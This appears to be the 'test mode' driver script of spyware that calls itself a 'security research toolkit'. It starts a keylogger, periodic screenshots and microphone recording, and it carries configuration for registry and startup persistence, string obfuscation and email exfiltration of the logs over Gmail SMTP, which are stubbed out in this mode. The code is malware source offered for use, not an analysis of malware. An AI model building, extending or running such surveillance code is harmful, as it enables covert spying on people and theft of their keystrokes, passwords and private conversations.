#!/usr/bin/env python3
"""
Test mode version of the security research toolkit.
Bypasses email validation for local testing.
"""
import os
import sys
import time
import threading
from datetime import datetime

# Import core modules
from core.surveillance import SurveillanceEngine
from core.persistence import PersistenceManager
from core.communication import DataExfiltrator
from core.crypto_utils import obfuscate_string, deobfuscate_string

# ============================================================================
# TEST CONFIGURATION - No email required for testing
# ============================================================================

# Dummy email configuration for testing
EMAIL_CONFIG = {
    'email': 'test@example.com',
    'password': 'test_password',
    'smtp_server': 'smtp.gmail.com',
    'smtp_port': 587,
    'use_tls': True
}

# Surveillance settings (shorter intervals for testing)
SURVEILLANCE_CONFIG = {
    'log_file': 'test_activity.log',
    'screenshot_interval': 60,   # 1 minute for testing
    'audio_interval': 120,       # 2 minutes for testing
    'audio_duration': 5          # 5 seconds for testing
}

# Persistence settings (disabled for testing)
PERSISTENCE_CONFIG = {
    'move_interval': 300,        # 5 minutes
    'enable_registry': False,    # Disabled for testing
    'enable_startup': False      # Disabled for testing
}

# Exfiltration settings (disabled for testing)
EXFILTRATION_CONFIG = {
    'report_interval': 3600,
    'enable_immediate': False    # Disabled for testing
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def setup_logging():
    """Setup logging with timestamp."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = f"test_activity_{timestamp}.log"
    return log_file

def start_surveillance(surv_engine, log_file):
    """Start surveillance activities."""
    print(f"Starting surveillance with log file: {log_file}")
    
    # Start keylogger
    surv_engine.start_keylogger(log_file=log_file)
    
    # Start periodic screenshots
    surv_engine.start_periodic_screenshots(
        interval=SURVEILLANCE_CONFIG['screenshot_interval']
    )
    
    # Start periodic audio recording
    surv_engine.start_periodic_audio(
        interval=SURVEILLANCE_CONFIG['audio_interval'],
        duration=SURVEILLANCE_CONFIG['audio_duration']
    )
    
    print("Surveillance started successfully")

def start_persistence():
    """Start persistence mechanisms (disabled in test mode)."""
    print("Persistence disabled in test mode")
    return None

def start_exfiltration(log_file):
    """Start data exfiltration (disabled in test mode)."""
    print("Exfiltration disabled in test mode")
    return None

def main():
    """Main execution function."""
    print("=" * 50)
    print("Security Research Toolkit - TEST MODE")
    print("=" * 50)
    print("Features enabled:")
    print("- Keylogging")
    print("- Screenshots (every 1 minute)")
    print("- Audio recording (every 2 minutes)")
    print("- File logging")
    print("Features disabled:")
    print("- Persistence")
    print("- Email exfiltration")
    print("=" * 50)
    
    try:
        # Setup logging
        log_file = setup_logging()
        
        # Start surveillance only
        surv_engine = SurveillanceEngine()
        start_surveillance(surv_engine, log_file)
        
        print("\n" + "=" * 50)
        print("Test mode active")
        print("Press Ctrl+C to stop")
        print("=" * 50)
        
        # Keep the main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nShutting down...")
            
            # Cleanup
            surv_engine.stop_keylogger()
            
            print("Shutdown complete")
    
    except Exception as e:
        print(f"Error during execution: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main() 